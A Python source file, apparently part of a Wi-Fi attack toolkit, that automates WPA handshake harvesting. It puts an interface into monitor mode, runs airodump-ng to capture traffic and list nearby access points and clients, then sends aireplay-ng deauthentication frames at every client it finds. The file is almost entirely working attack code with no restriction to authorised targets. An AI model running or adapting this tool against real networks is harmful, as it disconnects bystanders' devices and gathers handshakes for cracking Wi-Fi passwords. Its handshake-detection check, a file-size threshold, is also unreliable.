# attacks/handshake_harvester.py
import os
import time
import subprocess
from typing import Optional, Tuple, List
from utils.logger import Logger
from utils.image_state_manager import ImageStateManager


class HandshakeHarvester:
    """
    Handshake capture helper that:
      - Temporarily marks the capture interface as UNmanaged by NetworkManager
      - Enables monitor mode (airmon-ng first; iw fallback)
      - Runs a timed airodump-ng capture (CSV + CAP)
      - Cleanly stops monitor mode and restores the interface to managed
    This avoids the NetworkManager race that produced 'Error -16 (busy)' and
    the 'No APs found' regressions.
    """

    def __init__(self, logger: Optional[Logger] = None):
        self.logger = logger or Logger("logs/scan.log")
        self.image_state_manager = ImageStateManager()

    # ---------- small command helpers ----------

    def _run(self, cmd: List[str], timeout: int = 30) -> Tuple[str, str, int]:
        """Run a command and return (stdout, stderr, returncode)."""
        self.logger.log(f"[DEBUG] Running: {' '.join(cmd)}")
        try:
            p = subprocess.run(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, timeout=timeout
            )
            return p.stdout, p.stderr, p.returncode
        except subprocess.TimeoutExpired:
            self.logger.log(f"[WARNING] Command timed out: {' '.join(cmd)}")
            return "", "", 124

    def _exists(self, iface: str) -> bool:
        return os.path.exists(f"/sys/class/net/{iface}")

    # ---------- NM / interface management ----------

    def _nm_set_managed(self, iface: str, managed: bool) -> None:
        state = "yes" if managed else "no"
        self.logger.log(f"[DEBUG] nmcli set {iface} managed {state}")
        self._run(["sudo", "nmcli", "dev", "set", iface, "managed", state])

    def _iface_down(self, iface: str) -> None:
        self._run(["sudo", "ip", "link", "set", iface, "down"])

    def _iface_up(self, iface: str) -> None:
        self._run(["sudo", "ip", "link", "set", iface, "up"])

    def _direct_enable_monitor(self, iface: str) -> Optional[str]:
        """
        Fallback: try to put the *same* interface into monitor mode using iw.
        Returns the interface name to use (usually the same) or None on failure.
        """
        self.logger.log(f"[DEBUG] Trying direct iw monitor mode on {iface}")
        self._iface_down(iface)
        out, err, rc = self._run(["sudo", "iw", iface, "set", "type", "monitor"])
        if rc != 0:
            self.logger.log(f"[DEBUG] iw set type monitor failed on {iface}: {out or err}")
            return None
        self._iface_up(iface)
        self.logger.log(f"[INFO] Direct monitor mode enabled on {iface}")
        return iface

    def _airmon_enable(self, iface: str) -> Optional[str]:
        """
        Try airmon-ng start. Parse output to find wlanXmon name; if missing,
        fall back to base iface.
        """
        self.logger.log(f"[INFO] Enabling monitor mode on {iface} via airmon-ng")
        out, err, _ = self._run(["sudo", "airmon-ng", "start", iface])
        merged = out or err
        if ("monitor mode enabled" in merged) or ("monitor mode already" in merged):
            # Extract last token on the 'enabled on' line if present
            for line in merged.splitlines():
                lower = line.lower()
                if "monitor mode" in lower and "enabled on" in lower:
                    mon = line.strip().split()[-1]
                    self.logger.log(f"[DEBUG] airmon-ng reports monitor interface: {mon}")
                    return mon
            self.logger.log("[DEBUG] airmon-ng enabled monitor mode, using base iface")
            return iface
        self.logger.log(f"[ERROR] airmon-ng failed on {iface}:\n{merged}")
        return None

    def _airmon_stop(self, mon_iface: str) -> None:
        self.logger.log(f"[INFO] Stopping monitor interface {mon_iface}")
        self._run(["sudo", "airmon-ng", "stop", mon_iface])

    def _rfkill_unblock(self) -> None:
        self._run(["sudo", "rfkill", "unblock", "all"])

    def _restore_network_manager(self) -> None:
        """Ensure services are running after monitor work."""
        self.logger.log("[INFO] Restoring NetworkManager and wpa_supplicant...")
        self._run(["sudo", "systemctl", "start", "wpa_supplicant"])
        self._run(["sudo", "systemctl", "start", "NetworkManager"])
        self.logger.log("[DEBUG] Network services running (NM + wpa_supplicant).")

    def _restore_iface_managed(self, base_iface: str) -> None:
        """Return base iface to managed/managed yes and 'managed' type."""
        if not self._exists(base_iface):
            self.logger.log(f"[WARNING] {base_iface} missing during restore.")
            return
        self._iface_down(base_iface)
        # put back to managed (station)
        self._run(["sudo", "iw", base_iface, "set", "type", "managed"])
        self._iface_up(base_iface)
        self._nm_set_managed(base_iface, True)
        self.logger.log(f"[DEBUG] {base_iface} restored: managed mode + NM managed yes.")

    # ---------- scanning ----------

    def _scan_access_points(self, mon_iface: str, ssid: str) -> Tuple[int, List[Tuple[str, str]], str]:
        """
        Run a timed airodump-ng capture. Returns (ap_count, clients, scan_basepath)
        """
        self.logger.log(f"[INFO] Scanning for nearby access points on {mon_iface} ...")

        capture_dir = "logs/handshakes"
        os.makedirs(capture_dir, exist_ok=True)
        scan_base = os.path.join(capture_dir, f"{ssid.replace(' ', '_')}_handshake")

        # Clean previous run artifacts
        for ext in ("-01.csv", "-01.cap"):
            try:
                os.remove(scan_base + ext)
            except FileNotFoundError:
                pass

        # Long enough to hop through 2.4/5GHz
        self._run([
            "sudo", "timeout", "30",
            "airodump-ng", "--write-interval", "1",
            "--output-format", "csv,cap", "-w", scan_base, mon_iface
        ], timeout=35)

        csv_file = f"{scan_base}-01.csv"
        cap_file = f"{scan_base}-01.cap"
        ap_count, clients = 0, []

        if os.path.exists(csv_file):
            with open(csv_file, "r", errors="ignore") as f:
                lines = f.readlines()

            # AP section
            for line in lines:
                if line.strip().startswith("Station MAC"):
                    break
                if line.strip() and not line.startswith("BSSID") and "," in line:
                    ap_count += 1

            # Clients section
            client_section = False
            for line in lines:
                if line.strip().startswith("Station MAC"):
                    client_section = True
                    continue
                if client_section and line.strip() and "," in line:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 6:
                        client_mac = parts[0]
                        ap_mac = parts[5]
                        if client_mac and ap_mac:
                            clients.append((ap_mac, client_mac))

        self.logger.log(f"[INFO] Scan complete. Found {ap_count} AP(s) and {len(clients)} client(s).")
        if os.path.exists(cap_file):
            self.logger.log(f"[DEBUG] Capture file created: {os.path.basename(cap_file)} (size {os.path.getsize(cap_file)} B)")
        else:
            self.logger.log("[WARNING] No capture (.cap) file produced by airodump-ng.")
        return ap_count, clients, scan_base

    def _deauth_clients(self, mon_iface: str, clients: List[Tuple[str, str]]) -> None:
        if not clients:
            self.logger.log("[INFO] No clients to deauth; skipping.")
            return
        self.logger.log(f"[INFO] Deauthenticating {len(clients)} client(s) ...")
        for ap_mac, client_mac in clients:
            self._run([
                "sudo", "aireplay-ng", "--deauth", "5",
                "-a", ap_mac, "-c", client_mac, mon_iface
            ], timeout=10)

    # ---------- public API ----------

    def capture_handshakes(self, interface: str, ssid: str) -> Tuple[int, str, bool]:
        """
        Full handshake cycle:
          1. Pick a base iface (prefer the requested one; fallback to wlan1 if needed)
          2. Mark it unmanaged by NetworkManager
          3. Enable monitor mode (airmon-ng; iw fallback)
          4. airodump-ng timed capture (CSV + CAP)
          5. Optional deauth
          6. Stop monitor; restore iface + NM; restart services
        Returns: (ap_count, conn_iface, handshake_captured)
        """
        self.logger.log(f"[INFO] Starting handshake harvesting phase for SSID: {ssid}")

        # Choose candidate(s): try the requested first, then wlan1 if different and present.
        candidates = [interface]
        if "wlan1" not in candidates and self._exists("wlan1"):
            candidates.append("wlan1")

        monitor_iface: Optional[str] = None
        base_iface: Optional[str] = None

        # Try each candidate until monitor mode is live
        for cand in candidates:
            if not self._exists(cand):
                self.logger.log(f"[DEBUG] Skipping {cand}: interface not present.")
                continue

            self.logger.log(f"[INFO] Preparing {cand} for monitor mode (isolating from NM).")
            self._rfkill_unblock()
            self._nm_set_managed(cand, False)  # critical to avoid -16 NM race

            # Try airmon-ng first
            mon = self._airmon_enable(cand)
            if not mon:
                # Backoff + fallback to direct iw
                self.logger.log("[DEBUG] airmon-ng failed; retrying with direct iw fallback after short backoff.")
                time.sleep(1.0)
                mon = self._direct_enable_monitor(cand)

            if mon:
                monitor_iface, base_iface = mon, cand
                break

            # If both methods failed, re-allow NM management for this cand and try next
            self._nm_set_managed(cand, True)
            self.logger.log(f"[WARNING] Monitor mode unavailable on {cand}; trying next candidate...")

        if not monitor_iface or not base_iface:
            self.logger.log("[ERROR] Unable to enable monitor mode on any interface. Skipping handshake capture.")
            return 0, interface, False

        # Do the scan
        ap_count, clients, scan_base = self._scan_access_points(monitor_iface, ssid)

        # Heuristic for deciding if we got a real handshake
        handshake_captured = False
        cap_path = f"{scan_base}-01.cap"
        if ap_count > 0 and os.path.exists(cap_path) and os.path.getsize(cap_path) > 2048:
            handshake_captured = True

        # Optional deauth if we actually saw clients
        if clients:
            self._deauth_clients(monitor_iface, clients)
        else:
            self.logger.log("[INFO] No associated clients observed; skipping deauth.")

        # Tear down monitor + restore iface and services
        try:
            if monitor_iface.endswith("mon"):
                self._airmon_stop(monitor_iface)
            else:
                # direct iw path: flip back to managed
                self._restore_iface_managed(base_iface)
        except Exception as exc:
            self.logger.log(f"[WARNING] Error while stopping monitor interface {monitor_iface}: {exc}")

        # Always restore NM management and services for the base iface
        self._nm_set_managed(base_iface, True)
        self._restore_network_manager()

        # Decide which iface to use for connection phase
        conn_iface = base_iface if base_iface else interface
        if not self._exists(conn_iface):
            conn_iface = "wlan0" if self._exists("wlan0") else interface

        return ap_count, conn_iface, handshake_captured
